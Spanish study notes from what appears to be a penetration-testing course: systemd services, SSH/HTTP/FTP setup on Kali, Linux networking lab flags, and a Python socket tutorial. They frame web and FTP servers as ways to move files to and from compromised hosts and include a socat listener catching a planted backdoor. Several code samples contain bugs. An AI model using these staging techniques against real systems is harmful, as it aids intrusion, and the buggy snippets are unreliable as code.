lrwxrwxrwx 1 root root   17 Apr 12 11:21 /lib/systemd/system/runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Apr 12 11:21 /lib/systemd/system/runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Apr 12 11:21 /lib/systemd/system/runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Apr 12 11:21 /lib/systemd/system/runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Apr 12 11:21 /lib/systemd/system/runlevel6.target -> reboot.target
...
```

Los objetivos de nivel de ejecución están asociados con sus respectivas unidades de destino que mejor correlacionan el sistema SysV Init heredado con Systemd.

Hay mucho más en Systemd que lo que cubrimos aquí. Cubrimos servicios y targets-unit, pero hay otros tipos como *mount*, *link*, *socket*, *device* y más. Estos no son tan importantes de entender como el concepto de servicios y cómo se relaciona con el sistema SysV Init heredado.

Con este conocimiento, podemos trabajar con servicios en un sistema basado en Systemd. También podemos determinar qué archivos de servicio están asociados con qué unidad de destino y el orden en que se iniciarán esos servicios.

<br />

**Exercises**

**1. ¿Qué destino systemd proporciona la GUI?**

```bash
[root@systemd ~]# systemctl list-units --type=target --all 
  UNIT                   LOAD      ACTIVE   SUB    DESCRIPTION          
        
  basic.target           loaded    active   active Basic System                 
● cryptsetup.target      not-found inactive dead   cryptsetup
.target            
  emergency.target       loaded    inactive dead   Emergency Mode               
  getty-pre.target       loaded    inactive dead   Login Prompts (Pre)          
  getty.target           loaded    active   active Login Prompts                
  --> graphical.target       loaded    active   active Graphical Interface  
```

<br />

**2.  ¿Cuántos servicios están cargados actualmente en este host?**

```bash
[root@systemd ~]# systemctl list-units --type=service 
  UNIT                           LOAD   ACTIVE     SUB     JOB  
 DESCRIPTION                           
● broken.service                 loaded failed     
failed        Deliberately made broken service      
  dbus-broker.service            loaded active     running       D-Bus System Message Bus              
  dnf-makecache.service          loaded activating start   start dnf makecache                         
  httpd.service                  loaded active     running       The Apache HTTP Server                
  mysteryConnect.service         loaded active     running       Connect and respond TCP 1024          
  sshd.service                   loaded active     running       OpenSSH server daemon                 
  systemd-homed.service          loaded active     running       Home Area Manager                     
  systemd-journal-flush.service  loaded active     exited        Flush Journal to Persistent Storage   
  systemd-journald.service       loaded active     running       Journal Service                       
  systemd-logind.service         loaded active     running       User Login Management                 
  systemd-resolved.service       loaded active     running       Network Name Resolution               
  systemd-tmpfiles-setup.service loaded active     exited        Create Volatile Files and Directories 
  systemd-update-utmp.service    loaded active     exited        Update UTMP about System Boot/Shutdown
  systemd-user-sessions.service  loaded active     exited        Permit User Sessions                  
  systemd-userdbd.service        loaded active     running       User Database Manager                 
  user-runtime-dir@0.service     loaded active     exited        User Runtime Directory /run/user/0    
  user@0.service                 loaded active     running       User Manager for UID 0                
  web.status.service             loaded active     running       Check whether httpd is enabled        

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.
JOB    = Pending job for the unit.

16 loaded units listed. Pass --all to see loaded but inactive units, too.

```

<br />

**3.  Hay un servicio defectuoso en este sistema. ¿Qué es? Proporcione el nombre del servicio, solo.**

broken.service

<br />

**4.  Inicie el servicio *MysteryConnect*. Conéctese con netcat o socat para obtener la bandera.**

```bash
systemctl start mysteryConnect; systemctl status mysteryConnect

● mysteryConnect.service - Connect and respond TCP 1024
    Loaded: loaded (/etc/systemd/system/mysteryConnect.service; enabled; vendor preset: disabled)
   Active: active (running) since Wed 2023-01-18 17:47:36 UTC; 17min ago
   Main PID: 568 (1024.py)
      Tasks: 1 (limit: 1066)
     Memory: 3.9M
     CGroup: /system.slice/containerd.service/system.slice/mysteryConnect.service
             └─568 /usr/bin/python3 /opt/1024.py

Jan 18 17:47:36 systemd systemd[1]: Started Connect and respond TCP 1024.
Jan 18 17:48:39 systemd 1024.py[568]: Exception in thread Thread-1:
Jan 18 17:48:39 systemd 1024.py[568]: Traceback (most recent call last):
Jan 18 17:48:39 systemd 1024.py[568]:   File "/usr/lib64/python3.9/threading.py", line 973, in _bootstrap_inner
Jan 18 17:48:39 systemd 1024.py[568]:     self.run()
Jan 18 17:48:39 systemd 1024.py[568]:   File "/opt/1024.py", line 23, in run
Jan 18 17:48:39 systemd 1024.py[568]:     self.sock.send(b'SYSTEMD{Are_we_running?}')
Jan 18 17:48:39 systemd 1024.py[568]: BrokenPipeError: [Errno 32] Broken pipe

```

Podemos ver en la descripción del servicio la línea ''Connect and respond TCP 1024". De esta forma nos conectamos con netcat al localhost puerto 1024 y recibimos la flag.

```bash
netcat localhost 1024
```

<br />

**5. Habilite el servicio HTTP en este host. Una vez que el servicio esté habilitado, la bandera estará en el directorio /root**.

Listamos los servicios para ver cuál es el servicio HTTP:

```bash
[root@systemd ~]# systemctl list-units --type=service | grep http
  httpd.service                  loaded active running The Apache HTTP Server                
  web.status.service             loaded active running Check whether httpd is enabled  
```

Y a continuación lo habilitamos:

```bash
systemctl enable httpd.service
```

<br />


#### 2.15. SSH.

El servicio *Secure Shell* (SSH) se usa más comúnmente para acceder de forma remota a una computadora, usando un protocolo seguro y encriptado. El servicio SSH está basado en TCP y escucha de forma predeterminada en el puerto 22. Para iniciar el servicio SSH en Kali, escribimos el siguiente comando en una terminal Kali.

```
kali@kali:~# sudo systemctl start ssh
[sudo] password for kali:
```

Podemos verificar que el servicio SSH se está ejecutando y escuchando en el puerto TCP 22 usando el comando **netstat** y canalizando la salida a **grep** para buscar **sshd** en la salida .

**netstat** está obsoleto y se reemplazó con **ss** . Algunas distribuciones de Linux, como Kali, aún incluyen **netstat** por conveniencia.

```
kali@kali:~# sudo netstat -antp|grep sshd
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 25035/sshd 
tcp6 0 0 :::22 :::* LISTEN 25035/sshd
```

Si, como muchos usuarios, queremos que el servicio SSH se inicie automáticamente en el momento del arranque, debemos habilitarlo mediante **systemctl** .

```
kali@kali:~$ sudo systemctl enable ssh
Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Created symlink /etc/systemd/system/sshd.service → /lib/systemd/system/ssh.service.
Created symlink /etc/systemd/system/multi-user.target.wants/ssh.service → /lib/systemd/system/ssh.service.
```

Con la acción de **habilitación** ejecutada para el servicio SSH, SSH se iniciará cada vez que se encienda el sistema.

A menos que ssh se use con mucha frecuencia, le recomendamos que inicie y detenga el servicio según sea necesario. Como tal, podemos deshabilitar el servicio para evitar que se inicie en el momento del arranque.

```
kali@kali:~$ sudo systemctl disable ssh
Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install disable ssh
Removed /etc/systemd/system/multi-user.target.wants/ssh.service.
Removed /etc/systemd/system/sshd.service.
```

Con el servicio deshabilitado, SSH ya no se iniciará automáticamente en el momento del arranque.

Ahora que sabemos cómo iniciar el servicio ssh, podemos usarlo para obtener acceso a nuestro host desde otras máquinas. SSH es una utilidad muy común y útil.

<br />

#### 2.16. HTTP.

El servicio HTTP puede ser útil durante una prueba de penetración, ya sea para alojar un sitio o proporcionar una plataforma para descargar archivos a la máquina de la víctima. El servicio HTTP está basado en TCP y escucha de forma predeterminada en el puerto 80. Para iniciar el servicio HTTP en Kali, escribimos el siguiente comando en una terminal:

```
kali@kali:~$ sudo systemctl start apache2
[sudo] password for kali:
```

Como hicimos con el servicio SSH, podemos verificar que el servicio HTTP se está ejecutando y escuchando en el puerto TCP 80 usando **netstat** y **grep** una vez más.

```
kali@kali:~$ sudo netstat -antp | grep apache
tcp6       0      0 :::80                   :::*                    LISTEN      4378/apache2
```

El servicio apache2 está actualmente escuchando en el puerto 80.

Hay otra forma común de crear un servidor web temporal que usa Python. Es útil tener una solución temporal para ejecutar bajo demanda y no preocuparse por exponer puertos en nuestro host Kali que no necesitamos. Antes de que podamos mostrar eso en el puerto 80, necesitaremos detener el servicio apache2.

```
kali@kali:~$ sudo systemctl stop apache2
[sudo] password for kali:
```

Ahora que no tendremos un conflicto de puertos en el puerto 80, usemos el módulo Python *http.server* para iniciar un servidor web.

```
kali@kali:~$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

La sesión de terminal se cuelga después de la ejecución de este comando. Esto se debe a que la aplicación se está ejecutando actualmente. Cuando hayamos terminado con nuestras necesidades de servicios web, simplemente podemos ingresar C + c .

Ahora que cubrimos dos formas de iniciar un servidor web, podemos usar esto en compromisos de prueba de penetración para descargar archivos en un host comprometido.

<br />

#### 2.17. FTP.

El _Protocolo_ de transferencia de archivos (FTP) es una excelente manera de transferir archivos rápidamente de un host a otro. Esto se puede usar para compartir archivos en la misma red o incluso extraer archivos de máquinas comprometidas. Creemos un servidor FTP simple en nuestro host Kali.

Instalemos rápidamente el servidor Pure-FTPd en nuestra máquina de ataque Kali.

```
kali@kali:~$ sudo apt update && sudo apt install pure-ftpd
```

Después de ejecutar el comando anterior, se instalará pure-ftpd.

Antes de que cualquier cliente pueda conectarse a nuestro servidor FTP, debemos crear un nuevo usuario para Pure-FTPd. El siguiente script de Bash automatizará la creación de usuarios para nosotros:

```
kali@kali:~$ cat ./setup-ftp.sh
#!/bin/bash

sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
sudo cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

El script crea el grupo, el usuario, la contraseña, la base de datos, los enlaces simbólicos y el directorio necesarios para servir los archivos y reinicia el servicio.

Haremos que el script sea ejecutable y luego lo ejecutaremos.

```
kali@kali:~$ chmod +x setup-ftp.sh

kali@kali:~$ sudo ./setup-ftp.sh
Password:
Enter it again:
Restarting ftp server
```

Ahora que tenemos configurado nuestro servidor FTP, podemos aprovechar esto con el nombre de usuario y la contraseña que agregamos al crear el servidor. Como siempre, solo ejecutaremos este servicio cuando sea necesario y lo detendremos cuando no sea así

<br />

#### 2.18. Ejercicio Networking Linux.

**1.  ¿Cuál es la dirección IP del host llamado Neo ?**

```bash
host Neo
```

<br />

**2.  ¿Cuál es la bandera en el host Neo?**

Sabiendo la IP con el 'host' y las credenciales mediante el enunciado nos conectamos mediante SSH

```bash
ssh t.anderson@10.0.0.15
```

Y una vez dentro obtenemos la flag.

<br />

**3.  Ahora que tiene acceso a Neo, obtenga acceso al servidor DNS/HTTP con la puerta trasera Trinity configurada antes de que abandonara el compromiso. La conexión puede tardar hasta un minuto en establecerse. ¿Cuál es la bandera en el servidor DNS/HTTP?**

Según el enunciado Tryinity a configurado una backdoor que se conecta a Neo cada un minuto en el puerto 101. Así, empleamos 'socat' disponible en el host Neo para escuchar la conexión:

```bash
socat TCP4-LISTEN:101 STDOUT
```

<br />

**4. ¿Cuál es el nombre de host del servidor DNS/HTTP?**

Morpheus

<br />

**5. ¿Cuál es el servicio web en el servidor DNS/HTTP?**

Listando todos los servicios con el comando 'service':

```bash
service --status-all

 [ - ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  cron
 [ - ]  dbus
 [ ? ]  hwclock.sh
 [ - ]  procps
 [ - ]  ssh

```

Obtenemos que se trata de apache2.

<br/>

**6.  Arregle el servidor web y hágalo accesible para su host Kali. La última bandera se puede encontrar con un navegador web. Utilizar la misma IP que el anfitrión del Ejercicio Final Práctico. Introduzca la bandera para la respuesta.**

En primer lugar, con service iniciamos el servidor y acontinuación comprobamos que se está ejecutando:

```bash
service apache2 start; service apache2 status
```

Seguidamente, revisamos el firewall de IPtables para comprobar que las conexiones entrantes o salientes no están siendo bloqueadas. Para mayor seguridad borramos cualquier regla reestrictiva:

```bash
iptables -D INPUT 1; iptables -D INPUT 2; iptables -D INPUT 3
```

Así, acudimos desde nuestra kali con el buscador a la IP del host original del ejercicio pero no encontramos nada. Revisamos el puerto en el que se está ofreciendo el servicio web en /etc/apache2/ports.conf pero no hay nada fuera de lo normal es el puerto por defecto. Así, acudimos a /var/www/html para ver los contenidos del directorio web y encontramos un directorio oculto que contiene el Flag en forma de .jpg: Nebuchadnezzar/LinNetPractical-flag-3.jpg. Así, acudimos a dicha dirección y obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230118215704.png' | relative_url }}" text-align="center"/>
</div>






























































### 3. Windows Networking & Services.

<br />

### 4. Network Scripting with Python.
#### 4.1. Escribir un Cliente de Python.

**Building a Basic Client. Sockets Basics, Exception Handling**

Aunque hay muchos lenguajes de programación que podemos usar para completar nuestras tareas, Python es un lenguaje muy popular que usan los pentesters para crear sus scripts de red. Esto se debe a su facilidad de uso y a la gran cantidad de librerías disponibles para ello.

Para que los programas y sistemas se comuniquen entre sí en una red, utilizan los *sockets* y la *API de socket* para enviar mensajes de ida y vuelta. Un socket es esencialmente un punto final que permite que la comunicación de red fluya entre dos programas que se ejecutan en una red. Podemos implementar sockets de red en varios tipos de canales diferentes.

Usemos el siguiente código de Python para comenzar a crear un script que use el módulo *socket*. Importaremos la biblioteca de sockets para nuestro script de Python y luego llamaremos al método *socket.socket*.

```python
#!/usr/bin/python3
#client.py

import socket

s = socket.socket(<socket_family>, <socket_type>, <protocol>)
```

Arriba, configuramos el método *socket.socket* en la variable *s*. El método *socket.socket* en sí contiene tres variables (actualmente no configuradas): *socket_family*, *socket_type* y *protocol*. Examinemos estos marcadores de posición de variables.

- *socket_family*: nos permite especificar un dominio de protocolo que actuará como mecanismo de transporte. El más común, AF_INET, se usa para el direccionamiento de Internet IPv4 y AF_INET6 se usa para el direccionamiento de Internet IPv6. AF_UNIX es la familia de direcciones para *Unix Domain Sockets* (UDS). Esta familia de sockets permite que el sistema operativo pase datos directamente de un proceso a otro, sin pasar por la pila de red.

- *socket_type*: permite la comunicación entre dos puntos finales. El tipo de socket suele ser SOCK_DGRAM para el UDP o SOCK_STREAM para el (TCP).

- *protocolo*: se puede utilizar para especificar el número de protocolo. Por lo general, se establece en 0, que es el valor predeterminado que se establecerá si no se especifica.

Para proporcionar valores a estas variables, crearemos un socket que se comunicará con una dirección IPv4 para transmitir nuestra comunicación a través de TCP.

```python
#!/usr/bin/python3
#client.py

import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```

Tenga en cuenta que no hemos especificado un protocolo, por lo que tendrá un valor predeterminado de 0 como se mencionó anteriormente.

<br />

**Socket Methods**

Antes de continuar, debemos comprender algunos de los métodos integrados en el módulo de socket (recordamos que un método es una función asociada a lo que podríamos considerar no propioamente un objeto o un tipo de dato de python). Construiremos lentamente a nuestro cliente aplicando cada método relevante. Al final de este proceso, tendremos un cliente de red completamente funcional que puede manejar errores y recibir datos de longitud arbitraria.

El tipo más común de aplicaciones de socket son las aplicaciones *cliente-servidor*, como la que estamos construyendo actualmente. Esto implica que un cliente realice una *solicitud* al servidor. El cliente entonces recibe una *respuesta* del servidor.

El módulo de socket viene con varios métodos para facilitar las diversas acciones que un cliente (o un servidor) realizará durante dicha comunicación. Hay tres conjuntos de métodos de socket que debemos tener en cuenta:

- métodos de socket de cliente. 
- métodos de socket de servidor.
- métodos de socket generales. 

Por lo general, aunque no siempre, un cliente invocará métodos de socket de cliente, un servidor invocará métodos de socket de servidor y ambos programas pueden hacer uso de los métodos generales.

- El método *socket.gethostname()* devuelve el nombre del sistema local. Lo usaremos en nuestros scripts para probar la ejecución en nuestra máquina local. Esto significa que si queremos ejecutar nuestros scripts contra un servidor externo, necesitaremos especificar la dirección IP del objetivo remoto. En el siguiente ejemplo, especificamos nuestro propio localhost con el método *socket.gethostname()* , y luego especificamos el puerto al que queremos conectarnos con un número entero.

```
#!/usr/bin/python3
#client.py

import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 8080
```

<br />

- El método *socket.connect(dirección)* se utiliza para iniciar una conexión con el servidor. El método requiere que especifiquemos un solo host y puerto (que se interpretan como un único parámetro) para conectarse, que definimos en las variables de *host* y *puerto*.

```
#!/usr/bin/python3
#client.py

import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 8080

client.connect((host, port)) # Connect to our client
```

Observe los paréntesis dobles dentro de la sintaxis 's.connect((host, port))'. La razón de esto es que el módulo de socket trata *(host, puerto)* como un solo argumento. Si solo incluyéramos un par de paréntesis, Python interpretaría nuestra sintaxis como un intento de proporcionar dos argumentos a un método que solo acepta uno.

Ahora que entendemos cómo usar el método *socket.connect*, hay algunos métodos generales de socket con los que debemos familiarizarnos para usarlos con nuestro cliente para que pueda recibir datos y terminar.

<br />

- El método *socket.recv(buffsize)* permite que el cliente reciba un mensaje TCP del socket. El argumento *buffsize* (tamaño de búfer) define la cantidad máxima de datos que el método puede recibir en cualquier momento.

```
#!/usr/bin/python3
#client.py

import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 8080

client.connect((host, port)) # Connect to our client
msg = client.recv(1024)

print (msg.decode('ascii'))
```

En la lista anterior, un cliente se conectaría a un servidor y luego imprimiría cualquier dato que reciba del servidor a través del método *socket.recv()*.

Ahora tenemos suficiente código para conectarnos a un servidor.

```
kali@kali:~$ python3 client.py
Connection Established
```

En la lista anterior, ejecutamos nuestro cliente contra un servidor que se ejecuta en nuestro propio servidor local y recibimos un mensaje del servidor de que se ha establecido la conexión.

<br />

- El método *socket.close()* es bastante sencillo ya que solo cerrará el socket. Esto se puede invocar desde cualquier extremo y terminará la conexión entre el cliente y el servidor.

```python
#!/usr/bin/python3
#client.py

import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 8080

client.connect((host, port)) # Connect to our client
msg = client.recv(1024)
client.close()

print (msg.decode('ascii'))
```

Ahora hemos creado un programa de cliente completamente funcional en Python. Repasemos lo que hemos aprendido hasta ahora. Nuestro script está diseñado para conectarse a un servidor local que se ejecuta en el puerto 8080. El método *socket.connect()* establecerá la conexión. Si la conexión es exitosa, el cliente recibirá un mensaje del servidor con *socket.recv()*. El método *socket.close()* cerrará el cliente y luego la función *print* decodificará y mostrará el mensaje del servidor.

<br />

**Exercises**

**1. ¿Qué familia de sockets nos permitirá conectarnos a un sistema que tenga una dirección IPv4?**

```
AF_INET
```

<br />

**2. Eche un vistazo a la siguiente sintaxis: s.connect(("127.0.0.1",9090)) . ¿Qué tipo de método de socket se invoca aquí?**

```
A. Clien
B. Server
C. Socke
D. General
```

A

<br />

**3. Este es un ejercicio de secuencias de comandos. Use Python para conectarse al servidor en el puerto 2000 de la máquina virtual proporcionada. Cuando un cliente se conecta al servidor, recibirá una determinada respuesta. Con su secuencia de comandos de Python, envíe esta respuesta exacta al servidor y recibirá una segunda respuesta. Su tarea es enviar y recibir 10 conexiones desde y hacia el servidor en 15 segundos para obtener la bandera.**

```bash
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.57.68', 2000))
for i in range(0,14):
    msg = s.recv(2048).decode()
    print(msg)
    s.send(msg.encode())
s.close()
```

<br />

**Exception Handling: Try y Except**

A veces, nuestro código de cliente puede no funcionar como se desea, porque el servidor responde de una manera que no esperamos, o porque no funciona correctamente. Para hacer que nuestro programa sea más robusto, podemos introducir el 'Exception Handling' que le dirá al cliente qué hacer si encuentra un error o un comportamiento inesperado.

Python utiliza los statements de *try* y *except* para manejar errores. Aquí hay un ejemplo de cómo se vería un par *try-except* en pseudocódigo.

```
try:
    do something
    break
except <exception type>:
    print an error statement
```

Una declaración de try intenta ejecutar cualquier código dentro del bloque de try. Si el código dentro del bloque de try se ejecuta con éxito, el programa omitirá el bloque de try y continuará su flujo de ejecución.

Sin embargo, si encuentra un error (también conocido como excepción), el flujo de ejecución saltará inmediatamente al bloque exception correspondiente con el *tipo de excepción* correspondiente. Luego, el código dentro del bloque *exception* se ejecuta para manejar el comportamiento inesperado. Una vez que el bloque de *excepción* termine de ejecutarse, el programa continuará con su flujo de ejecución.

Finalmente, si no hay un tipo de excepción correspondiente al error encontrado dentro del bloque *try*, el programa detendrá su ejecución porque no sabrá cómo continuar. Esto se llama una *excepción no controlada*.

Avancemos y agreguemos declaraciones de *try* y *exception* a nuestro cliente de Python.

```
#!/usr/bin/python3
#client.py

import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = socket.gethostname()
port = 8080

try:
    client.connect((host, port))
    msg = client.recv(1024)
    client.close()
    print (msg.decode('ascii'))
    
except ConnectionRefusedError:
    print ("The server is not accepting our connection request!")
    exit(1)
   
print ("This sentence will only print if the except block was not executed.")
```

El código anterior busca la excepción específica llamada _ConnectionRefusedError_ , que indica si un servidor no quiere o no puede aceptar la conexión del cliente. Podemos ejecutar nuestro código de cliente contra un servidor inexistente para validar los bloques de *prueba* y *excepción*.

```
kali@kali:~$  python3 client.py
The server is not accepting our connection request!
```

Observe cómo la última línea de nuestro programa no se ejecuta. Esto se debe a que el bloque de *excepción* imprime una declaración y luego sale del programa antes de que se pueda ejecutar la última línea.

Aquí, solo estamos usando el bloque *excepto* para imprimir una declaración y salir. Sin embargo, podríamos crear instrucciones mucho más complejas, lo que permitiría que nuestro programa realice diagnósticos, se conecte a otro servidor o haga algo no relacionado. En el siguiente ejercicio, usará las sentencias *try* y *except* para permitir que el programa se vuelva a conectar a un servidor un número arbitrario de veces.

<br />

**Exercises**

**El servidor que se ejecuta en el puerto 2001 de la máquina virtual proporcionada tiene errores; solo responde a veces. Asegúrese de que su programa cliente tenga un medio para manejar errores y reconectarse. Como en el ejercicio anterior, conecta 10 veces exitosas en 15 segundos para obtener la bandera.**

```bash
#!/usr/bin/python3

import socket

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "192.168.57.68"
    port = 2001
    client.connect((host, port))
    msg=client.recv(1024).decode()
    client.send(msg.encode())
    print(client.recv(1024).decode())

for i in range(16):
    try:
        connect_to_server()
    except ConnectionRefusedError:
        print ("The server is not accepting our connection request.")
        exit(1)
        connect_to_server()

```

<br />

En la demostración anterior, asumimos que el servidor solo enviará a nuestro cliente 1024 bytes de datos. A veces, es posible que no podamos anticipar el tamaño exacto de la respuesta del servidor. Ejecutemos nuestro cliente contra un servidor que nos envíe más de 1024 bytes y examinemos qué sucede.

Hemos ajustado nuestro servidor para enviar la cadena "Conexión establecida" seguida de 2000 caracteres "A". Luego ejecutaremos nuestro código de cliente y pasaremos los resultados a sed , tr y wc para contar el número exacto de A que recibimos del servidor.

```
kali@kali:~$ python3 client.py | sed 's/[^A]//g' | tr -d '\n' | wc -c
    1002
```


Dado que la cadena "Conexión establecida" tiene 22 caracteres, solo se envían al cliente 1002 de 2000 A. Esto se debe a que nuestra implementación del método *socket.recv* solo permite que nuestro cliente reciba 1024 bytes de datos.

La documentación del módulo de socket sugiere que el valor utilizado para cada llamada socket.recv en particular debe ser una pequeña potencia de 2, como 1024, 2048 o 4096. Cuando no sabemos cuántos bytes recibiremos, podemos procesar la respuesta en un bucle utilizando fragmentos más pequeños hasta que se hayan recibido todos los datos. En el siguiente ejercicio, agregará un bucle al programa cliente para que pueda recibir fragmentos arbitrarios de datos.

<br />

**Exercises**

**1. Connect to the server on port 2002 of the provided VM. The response you receive will be of unknown length, so build in some provisions in your client script to handle the responses using loops. You will need to connect to the server several times to receive the flag.** 

```python
#!/usr/bin/python3
import socket
import sys
#2002.py
 
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(('192.168.66.68',2002)) #En primer lugar iniciamos la conexión con el servidor.

payload = b''
i = 0

while True:
        data = sock.recv(1024)
        if data: #Si data no está vacío, entonces adherimos los datos recibidos a una variable llamada payload y aumentamos en uno un marcador que indica el número de trozos de datos recibidos.
                payload += data
                #print("Chunk %d recived" % i)
                i = i+1
        else: #Si data no ha recogido nada del servidor, entonces este ha finalizado el envío de datos y salimos del bucle.
                print("No data received")
                break

imageArray = payload.split(b'\r\n\r\n') #Después de mirar todo el contenido sabemos que se nos están enviando varios ficheros, con el objetivo de separarlos utilizamos el método .split de forma que se construye una lista de trozos que conforman cada fichero. Es decir, imageArray es una lista de ficheros en binario.

for i in range(0,len(imageArray)-1):
        pos = imageArray[i].find(b'\r\n')
        fileName = b'fetched' + imageArray[i][0:pos]
        fileContent = imageArray[i][pos+2:-2]
        with open(fileName,'wb+') as f:
                f.write(fileContent)

```

<br />

**Interactive Sockets**

En ocasiones podemos querer establecer una conexión con un servidor, y luego enviarle datos en base a la información que nos proporciona. Para ello, podemos crear un *Socket Interactivo* con la librería Telnet. Comencemos con nuestro código de cliente original e importemos *telnetlib*.

```
#!/usr/bin/python3
#interactive-client.py

import socket
import telnetlib

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 8080

client.connect((host, port)) # Connect to our client
msg = client.recv(1024)
client.close()

print (msg.decode('ascii'))
```

El *telnetlib* permite una implementación del protocolo Telnet. Modificaremos nuestro script para hacer uso del método *telnetlib.interact()*, que nos permitirá interactuar con el servidor dinámicamente. 

Para implementar este método, crearemos una función a la que llamaremos después de que nuestro cliente se haya conectado al servidor:

```
#!/usr/bin/python3
#interactive-client.py

import socket
import telnetlib

def interact(socket):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact() #Notemos que aunque este método se llama igual que la función que estamos creando, no hay conflicto porque esta variable tiene alcance dentro de la función pero no fuera de ella por lo que en el resto del código la única función 'interact' que existe es la que acabamos de definir.

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 8080

client.connect((host, port)) # Connect to our client
msg = client.recv(1024)
print (msg.decode('ascii'))

client.close()
```

El mecanismo que permite a este cliente mantener la interactividad con el servidor se realiza a través de la propia función de *interacción* de Telnet. Esta función configura un ciclo _while true_ que sigue leyendo y escribiendo datos. Dado que, _aunque verdadero_ siempre es verdadero, continúa leyendo y escribiendo datos desde y hacia el servidor hasta que se corta la conexión.

A continuación, llamaremos a nuestra nueva función después de conectarnos al servidor.

```
#!/usr/bin/python3
#interactive-client.py

import socket
import telnetlib

def interact(socket):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.66.68", 2003)) 
msg = s.recv(1024)
print (msg.decode('ascii'))
interact(s) #La función interact se genera sobre un socket abierto.
```


En la lista anterior, nuestro código de cliente ahora es capaz de interactuar dinámicamente con el servidor al que se conecta. Tenga en cuenta que esta funcionalidad depende de dos cosas:

1.  El servidor debe permitir que la conexión permanezca abierta. Si cierra la conexión, nuestro cliente no podrá enviar más datos.

2.  El servidor debe estar configurado para recibir los datos que le enviamos.

<br />

**Emplea el codigo anterior para conectarte a un servidor y contestar a ciertas preguntas**

```python
What is each period separated value of an IP address called?

Enter your answer: octet
What Linux commmand can be used to display a routing table?
Enter your answer: route
What Windows command is used to list directory contents?
Enter your answer: dir
OS{You-are-a-trivia-guru!}
*** Connection closed by remote host ***
```

<br />

#### 4.2. Escribir un Servidor en Python.

**Builiding a Basic Server**

Comenzaremos a construir nuestro servidor importando el módulo de socket, inicializando un socket y definiendo un host y un puerto:

```
#!/usr/bin/python3
#server.py

import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 8080
```

Tenga en cuenta que este código es casi idéntico al comienzo de nuestro código del lado del cliente. Ahora presentaremos algunos métodos de socket más que nuestro servidor deberá utilizar.

- El método *socket.bind(address)* vincula, o asigna, un puerto específico a nuestro programa. En este caso, queremos vincular nuestro servidor al puerto que definimos en la variable de _puerto ._

```
#!/usr/bin/python3
#server.py

import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 8080

server.bind((host, port))
```

Al igual que el método *socket.connect* , *socket.bind* espera como input una address completo como en el formato de (host, puerto). Es por eso que hay paréntesis dobles en la llamada al método.

- El método *socket.listen(int)* le dice al servidor que escuche las conexiones entrantes y espera un número entero.

```
#!/usr/bin/python3
#server.py

import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server = socket.gethostname()
port = 8080

server.bind((host, port))
server.listen(2) # Wait for a client connection. Only 2 clients can connect to the server
print('Server is listening for incoming connections')
```

El entero especificado en *socket.listen()* representa el número de clientes que el servidor permitirá conectarse a sí mismo simultáneamente. Una vez que el servidor está escuchando, informa su estado a través de la función de *print* .

- El método *socket.accept()* devuelve un par de valores ( *conn, address* ) donde _conn_ representa un nuevo socket que enviará y recibirá mensajes, y _address_ representa la dirección del cliente vinculada al socket.

```
#!/usr/bin/python3
#server.py

import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server = socket.gethostname()
port = 8080

server.bind((host, port))
server.listen(2) # Wait for a client connection. Only 2 clients can connect to the server
print('Server is listening for incoming connections')

while True:
    conn, address = server.accept() # Establish the connection with the client
    print("Connection Received from %s" % str(addr))
```

En la lista anterior, comenzamos un ciclo *while True* que permite las conexiones entrantes a través del par de _direcciones_ *conn* recién creado. Una vez que se haya establecido una conexión, nuestro servidor informará que se ha producido la conexión.

- El método de socket general *socket.send\/recv(bytes)* permite que un cliente o servidor envíe datos al socket. Estos datos se pueden recibir a través del método *socket.recv(buffsize)*. El argumento *bytes* proporcionará varios bytes que se enviarán al socket. Especificar estos bytes puede cambiar la forma en que el método interactúa con la máquina receptora.

```
#!/usr/bin/python3
#server.py

import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server = socket.gethostname()
port = 8080

server.bind((host, port))
